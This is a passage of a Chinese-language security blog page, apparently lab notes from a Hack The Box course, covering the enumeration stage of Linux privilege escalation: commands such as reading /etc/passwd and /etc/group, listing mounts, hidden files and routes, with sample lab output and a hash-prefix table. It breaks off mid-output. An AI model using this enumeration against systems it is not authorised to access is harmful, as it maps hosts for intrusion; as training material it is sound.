<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Linux Privilege Escalation | n2ryx&#39;s Blog</title>
  <meta name="author" content="n2ryx">
  
  <meta name="description" content="Linux 系统上的 root 帐户提供对操作系统的完全管理级别访问权限。在评估期间，可能会在 Linux 主机上获得低权限 shell，并需要将权限提升到 root 帐户。
Environment Enumeration枚举是特权提升的关键。有多个辅助脚本（如LinPEAS和LinEnum）可用于协助枚举。
Operating system and versionUbuntu 维护周期
1234567891011121314$ cat /etc/os-releaseNAME=&amp;quot;Ubuntu&amp;quot;VERSION=&amp;quot;20.04.4 LTS (Focal Fossa)&amp;quot;ID=ubuntuID_LIKE=debianPRETTY_NAME=&amp;quot;Ubuntu 20.04.4 LTS&amp;quot;VERSION_ID=&amp;quot;20.04&amp;quot;HOME_URL=&amp;quot;https://www.ubuntu.com/&amp;quot;SUPPORT_URL=&amp;quot;https://help.ubuntu.com/&amp;quot;BUG_REPORT_URL=&amp;quot;https://bugs.launchpad.net/ubuntu/&amp;quot;PRIVACY_POLICY_URL=&amp;quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&amp;quot;VERSION_CODENAME=focalUBUNTU_CODENAME=focal

PATH123$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

env1234567891011$ envSHELL=/bin/bashPWD=/home/htb-studentLOGNAME=htb-studentXDG_SESSION_TYPE=ttyMOTD_SHOWN=pamHOME=/home/htb-studentLANG=en_US.UTF-8&amp;lt;SNIP&amp;gt;"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="Linux Privilege Escalation"/>
  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 7.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/tool" title="All the tools.">
			  <i class="fa fa-terminal"></i>Tool
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> Linux Privilege Escalation</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>Linux 系统上的 root 帐户提供对操作系统的完全管理级别访问权限。在评估期间，可能会在 Linux 主机上获得低权限 shell，并需要将权限提升到 root 帐户。</p>
<h1 id="Environment-Enumeration"><a href="#Environment-Enumeration" class="headerlink" title="Environment Enumeration"></a>Environment Enumeration</h1><p>枚举是特权提升的关键。有多个辅助脚本（如<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a>和<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">LinEnum）</a>可用于协助枚举。</p>
<h2 id="Operating-system-and-version"><a href="#Operating-system-and-version" class="headerlink" title="Operating system and version"></a>Operating system and version</h2><p><a target="_blank" rel="noopener" href="https://ubuntu.com/about/release-cycle">Ubuntu 维护周期</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/os-release</span><br><span class="line"></span><br><span class="line">NAME=&quot;Ubuntu&quot;</span><br><span class="line">VERSION=&quot;20.04.4 LTS (Focal Fossa)&quot;</span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">PRETTY_NAME=&quot;Ubuntu 20.04.4 LTS&quot;</span><br><span class="line">VERSION_ID=&quot;20.04&quot;</span><br><span class="line">HOME_URL=&quot;https://www.ubuntu.com/&quot;</span><br><span class="line">SUPPORT_URL=&quot;https://help.ubuntu.com/&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.launchpad.net/ubuntu/&quot;</span><br><span class="line">PRIVACY_POLICY_URL=&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;</span><br><span class="line">VERSION_CODENAME=focal</span><br><span class="line">UBUNTU_CODENAME=focal</span><br></pre></td></tr></table></figure>

<h2 id="PATH"><a href="#PATH" class="headerlink" title="PATH"></a>PATH</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo $PATH</span><br><span class="line"></span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br></pre></td></tr></table></figure>

<h2 id="env"><a href="#env" class="headerlink" title="env"></a>env</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ env</span><br><span class="line"></span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PWD=/home/htb-student</span><br><span class="line">LOGNAME=htb-student</span><br><span class="line">XDG_SESSION_TYPE=tty</span><br><span class="line">MOTD_SHOWN=pam</span><br><span class="line">HOME=/home/htb-student</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Kernel-version"><a href="#Kernel-version" class="headerlink" title="Kernel version"></a>Kernel version</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br><span class="line"></span><br><span class="line">Linux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line"></span><br><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>

<h2 id="CPU-version"><a href="#CPU-version" class="headerlink" title="CPU version"></a>CPU version</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ lscpu </span><br><span class="line"></span><br><span class="line">Architecture:                    x86_64</span><br><span class="line">CPU op-mode(s):                  32-bit, 64-bit</span><br><span class="line">Byte Order:                      Little Endian</span><br><span class="line">Address sizes:                   43 bits physical, 48 bits virtual</span><br><span class="line">CPU(s):                          2</span><br><span class="line">On-line CPU(s) list:             0,1</span><br><span class="line">Thread(s) per core:              1</span><br><span class="line">Core(s) per socket:              2</span><br><span class="line">Socket(s):                       1</span><br><span class="line">NUMA node(s):                    1</span><br><span class="line">Vendor ID:                       AuthenticAMD</span><br><span class="line">CPU family:                      23</span><br><span class="line">Model:                           49</span><br><span class="line">Model name:                      AMD EPYC 7302P 16-Core Processor</span><br><span class="line">Stepping:                        0</span><br><span class="line">CPU MHz:                         2994.375</span><br><span class="line">BogoMIPS:                        5988.75</span><br><span class="line">Hypervisor vendor:               VMware</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Login-Shells"><a href="#Login-Shells" class="headerlink" title="Login Shells"></a>Login Shells</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/shells</span><br><span class="line"></span><br><span class="line"># /etc/shells: valid login shells</span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/rbash</span><br><span class="line">/bin/dash</span><br><span class="line">/usr/bin/dash</span><br><span class="line">/usr/bin/tmux</span><br><span class="line">/usr/bin/screen</span><br></pre></td></tr></table></figure>

<h2 id="Defense"><a href="#Defense" class="headerlink" title="Defense"></a>Defense</h2><p>通常，没有权限列举这些保护措施的配置，但了解这些保护措施（如果有权限的话）可以帮助不在某些任务上浪费时间。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Exec_Shield">Exec Shield</a></li>
<li><a target="_blank" rel="noopener" href="https://linux.die.net/man/8/iptables">iptables</a></li>
<li><a target="_blank" rel="noopener" href="https://apparmor.net/">AppArmor</a></li>
<li><a target="_blank" rel="noopener" href="https://www.redhat.com/en/topics/linux/what-is-selinux">SELinux</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/fail2ban/fail2ban">Fail2ban</a></li>
<li><a target="_blank" rel="noopener" href="https://www.snort.org/faq/what-is-snort">Snort</a></li>
<li><a target="_blank" rel="noopener" href="https://wiki.ubuntu.com/UncomplicatedFirewall">Uncomplicated Firewall (ufw)</a></li>
</ul>
<h2 id="Drives-and-Shares"><a href="#Drives-and-Shares" class="headerlink" title="Drives and Shares"></a>Drives and Shares</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ lsblk</span><br><span class="line"></span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0   55M  1 loop /snap/core18/1705</span><br><span class="line">loop1                       7:1    0   69M  1 loop /snap/lxd/14804</span><br><span class="line">loop2                       7:2    0   47M  1 loop /snap/snapd/16292</span><br><span class="line">loop3                       7:3    0  103M  1 loop /snap/lxd/23339</span><br><span class="line">loop4                       7:4    0   62M  1 loop /snap/core20/1587</span><br><span class="line">loop5                       7:5    0 55.6M  1 loop /snap/core18/2538</span><br><span class="line">sda                         8:0    0   20G  0 disk </span><br><span class="line">├─sda1                      8:1    0    1M  0 part </span><br><span class="line">├─sda2                      8:2    0    1G  0 part /boot</span><br><span class="line">└─sda3                      8:3    0   19G  0 part </span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /</span><br><span class="line">sr0                        11:0    1  908M  0 rom </span><br></pre></td></tr></table></figure>

<h2 id="lpstat"><a href="#lpstat" class="headerlink" title="lpstat"></a>lpstat</h2><p>查找有关连接到系统的任何打印机的信息。</p>
<h2 id="fstab"><a href="#fstab" class="headerlink" title="fstab"></a>fstab</h2><p>检查已安装和未安装的驱动器，&#x2F;etc&#x2F;fstab</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/fstab</span><br><span class="line"></span><br><span class="line"># /etc/fstab: static file system information.</span><br><span class="line">#</span><br><span class="line"># Use &#x27;blkid&#x27; to print the universally unique identifier for a</span><br><span class="line"># device; this may be used with UUID= as a more robust way to name devices</span><br><span class="line"># that works even if disks are added and removed. See fstab(5).</span><br><span class="line">#</span><br><span class="line"># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;</span><br><span class="line"># / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation</span><br><span class="line">/dev/disk/by-id/dm-uuid-LVM-BdLsBLE4CvzJUgtkugkof4S0dZG7gWR8HCNOlRdLWoXVOba2tYUMzHfFQAP9ajul / ext4 defaults 0 0</span><br><span class="line"># /boot was on /dev/sda2 during curtin installation</span><br><span class="line">/dev/disk/by-uuid/20b1770d-a233-4780-900e-7c99bc974346 /boot ext4 defaults 0 0</span><br></pre></td></tr></table></figure>

<h2 id="Route-Table"><a href="#Route-Table" class="headerlink" title="Route Table"></a>Route Table</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ route</span><br><span class="line"></span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">default         _gateway        0.0.0.0         UG    0      0        0 ens192</span><br><span class="line">10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -rn</span><br></pre></td></tr></table></figure>

<h2 id="Arp-Table"><a href="#Arp-Table" class="headerlink" title="Arp Table"></a>Arp Table</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ arp -a</span><br><span class="line"></span><br><span class="line">_gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192</span><br></pre></td></tr></table></figure>

<h2 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin</span><br><span class="line">mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash</span><br><span class="line">bjones:x:1001:1001::/home/bjones:/bin/sh</span><br><span class="line">administrator.ilfreight:x:1002:1002::/home/administrator.ilfreight:/bin/sh</span><br><span class="line">backupsvc:x:1003:1003::/home/backupsvc:/bin/sh</span><br><span class="line">cliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash</span><br><span class="line">logger:x:1005:1005::/home/logger:/bin/sh</span><br><span class="line">shared:x:1006:1006::/home/shared:/bin/sh</span><br><span class="line">stacey.jenkins:x:1007:1007::/home/stacey.jenkins:/bin/bash</span><br><span class="line">htb-student:x:1008:1008::/home/htb-student:/bin/bash</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>哈希算法列表：</p>
<table>
<thead>
<tr>
<th>Algorithm</th>
<th>Hash</th>
</tr>
</thead>
<tbody><tr>
<td>Salted MD5</td>
<td><code>$1$</code>…</td>
</tr>
<tr>
<td>SHA-256</td>
<td><code>$5$</code>…</td>
</tr>
<tr>
<td>SHA-512</td>
<td><code>$6$</code>…</td>
</tr>
<tr>
<td>BCrypt</td>
<td><code>$2a$</code>…</td>
</tr>
<tr>
<td>Scrypt</td>
<td><code>$7$</code>…</td>
</tr>
<tr>
<td>Argon2</td>
<td><code>$argon2i$</code>…</td>
</tr>
</tbody></table>
<p>检查哪些用户有登录 shell。一旦看到系统上有哪些 shell，就可以检查每个版本是否存在漏洞。因为过时的版本（例如 Bash 版本 4.1）容易受到<code>shellshock</code>攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ grep &quot;*sh$&quot; /etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash</span><br><span class="line">bjones:x:1001:1001::/home/bjones:/bin/sh</span><br><span class="line">administrator.ilfreight:x:1002:1002::/home/administrator.ilfreight:/bin/sh</span><br><span class="line">backupsvc:x:1003:1003::/home/backupsvc:/bin/sh</span><br><span class="line">cliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash</span><br><span class="line">logger:x:1005:1005::/home/logger:/bin/sh</span><br><span class="line">shared:x:1006:1006::/home/shared:/bin/sh</span><br><span class="line">stacey.jenkins:x:1007:1007::/home/stacey.jenkins:/bin/bash</span><br><span class="line">htb-student:x:1008:1008::/home/htb-student:/bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="Groups"><a href="#Groups" class="headerlink" title="Groups"></a>Groups</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/group</span><br><span class="line"></span><br><span class="line">root:x:0:</span><br><span class="line">daemon:x:1:</span><br><span class="line">bin:x:2:</span><br><span class="line">sys:x:3:</span><br><span class="line">adm:x:4:syslog,htb-student</span><br><span class="line">tty:x:5:syslog</span><br><span class="line">disk:x:6:</span><br><span class="line">lp:x:7:</span><br><span class="line">mail:x:8:</span><br><span class="line">news:x:9:</span><br><span class="line">uucp:x:10:</span><br><span class="line">man:x:12:</span><br><span class="line">proxy:x:13:</span><br><span class="line">kmem:x:15:</span><br><span class="line">dialout:x:20:</span><br><span class="line">fax:x:21:</span><br><span class="line">voice:x:22:</span><br><span class="line">cdrom:x:24:htb-student</span><br><span class="line">floppy:x:25:</span><br><span class="line">tape:x:26:</span><br><span class="line">sudo:x:27:mrb3n,htb-student</span><br><span class="line">audio:x:29:pulse</span><br><span class="line">dip:x:30:htb-student</span><br><span class="line">www-data:x:33:</span><br></pre></td></tr></table></figure>

<h2 id="getent"><a href="#getent" class="headerlink" title="getent"></a>getent</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ getent group sudo</span><br><span class="line"></span><br><span class="line">sudo:x:27:mrb3n</span><br></pre></td></tr></table></figure>

<h2 id="home"><a href="#home" class="headerlink" title="&#x2F;home"></a>&#x2F;home</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls /home</span><br><span class="line"></span><br><span class="line">administrator.ilfreight  bjones       htb-student  mrb3n   stacey.jenkins</span><br><span class="line">backupsvc                cliff.moore  logger       shared</span><br></pre></td></tr></table></figure>

<h2 id="Mount"><a href="#Mount" class="headerlink" title="Mount"></a>Mount</h2><h3 id="已挂载的文件"><a href="#已挂载的文件" class="headerlink" title="已挂载的文件"></a>已挂载的文件</h3><p>挂载文件系统，用户必须具有 root 权限。挂载文件系统后，具有 root 权限的用户可以将其卸载。可能有权访问此类文件系统，并可能在其中找到敏感信息、文档或应用程序。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ df -h</span><br><span class="line"></span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">udev            1,9G     0  1,9G   0% /dev</span><br><span class="line">tmpfs           389M  1,8M  388M   1% /run</span><br><span class="line">/dev/sda5        20G  7,9G   11G  44% /</span><br><span class="line">tmpfs           1,9G     0  1,9G   0% /dev/shm</span><br><span class="line">tmpfs           5,0M  4,0K  5,0M   1% /run/lock</span><br><span class="line">tmpfs           1,9G     0  1,9G   0% /sys/fs/cgroup</span><br><span class="line">/dev/loop0      128K  128K     0 100% /snap/bare/5</span><br><span class="line">/dev/loop1       62M   62M     0 100% /snap/core20/1611</span><br><span class="line">/dev/loop2       92M   92M     0 100% /snap/gtk-common-themes/1535</span><br><span class="line">/dev/loop4       55M   55M     0 100% /snap/snap-store/558</span><br><span class="line">/dev/loop3      347M  347M     0 100% /snap/gnome-3-38-2004/115</span><br><span class="line">/dev/loop5       47M   47M     0 100% /snap/snapd/16292</span><br><span class="line">/dev/sda1       511M  4,0K  511M   1% /boot/efi</span><br><span class="line">tmpfs           389M   24K  389M   1% /run/user/1000</span><br><span class="line">/dev/sr0        3,6G  3,6G     0 100% /media/htb-student/Ubuntu 20.04.5 LTS amd64</span><br><span class="line">/dev/loop6       50M   50M     0 100% /snap/snapd/17576</span><br><span class="line">/dev/loop7       64M   64M     0 100% /snap/core20/1695</span><br><span class="line">/dev/loop8       46M   46M     0 100% /snap/snap-store/599</span><br><span class="line">/dev/loop9      347M  347M     0 100% /snap/gnome-3-38-2004/119</span><br></pre></td></tr></table></figure>

<h3 id="未挂载的文件系统"><a href="#未挂载的文件系统" class="headerlink" title="未挂载的文件系统"></a>未挂载的文件系统</h3><p>卸载文件系统的原因有很多，例如磁盘被移除，或者不再需要文件系统。另一个原因可能是文件、脚本、文档和其他重要信息不能由标准用户安装和查看。因此，如果可以将权限扩展到用户<code>root</code>，就可以自己安装和读取这些文件系统。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/fstab | grep -v &quot;#&quot; | column -t</span><br><span class="line"></span><br><span class="line">UUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1</span><br><span class="line">UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1</span><br><span class="line">/swapfile                                  none       swap  sw                 0  0</span><br></pre></td></tr></table></figure>

<h2 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -name &quot;.*&quot; -exec ls -l &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h2 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h2><p>默认情况下，<code>/var/tmp</code>中的所有文件最多保留 30 天， <code>/tmp</code> 中的所有文件会在 10 天后自动删除。<code>/dev/shm</code> 是 Linux 系统中的一个临时文件系统，专门用于共享内存（Shared Memory）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp</span><br><span class="line">/var/tmp</span><br><span class="line">/dev/shm</span><br></pre></td></tr></table></figure>

<h1 id="Service-Enumeration"><a href="#Service-Enumeration" class="headerlink" title="Service Enumeration"></a>Service Enumeration</h1><h2 id="Interface"><a href="#Interface" class="headerlink" title="Interface"></a>Interface</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ip a</span><br><span class="line"></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state 